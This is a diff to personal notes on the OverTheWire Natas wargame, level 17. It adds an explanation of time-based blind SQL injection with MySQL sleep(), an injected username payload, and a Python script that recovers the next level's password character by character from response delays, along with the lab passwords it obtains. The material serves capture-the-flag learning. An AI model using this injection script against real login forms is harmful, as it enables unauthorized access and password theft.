@@ -247,4 +247,34 @@ got XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
 level 17
 access http://natas17.natas.labs.overthewire.org/ with natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
 similar to level 15, but this time there is no echo
-when there is no different in content, 
+when there is no different in content, mysql has a sleep function
+we could add sleep(2) in query, like natas18" and password like "A%" and sleep(2) and password like "A%
+it times out and returns different answers so many times...two findings:
+1) sleep(2) isnt enough, because the processing time maybe from server itself
+2) if it timeout in the middle, start next searching from the known part of the password. If it stopped in the middle, remove last few chars from the known password
+---code---
+#!/usr/bin/python3
+import requests
+import base64
+
+s=requests.Session()
+s.auth = ("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
+possibles="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+password="dummy"
+#newpassword=""
+newpassword="8NEDUU"
+while(password != newpassword):
+    password=newpassword
+    for char in possibles:
+        result=s.post("http://natas17.natas.labs.overthewire.org/index.php", 
+            data = {"username": "natas18\" and if(password like BINARY \"" + password + char + "%\", sleep(5), 1) and \"1\"=\"1"});
+
+        if result.elapsed.seconds >= 5:
+            newpassword=password+char
+            print(newpassword)
+            break
+---
+got 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+level 18
+access http://natas18.natas.labs.overthewire.org/ with natas17:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
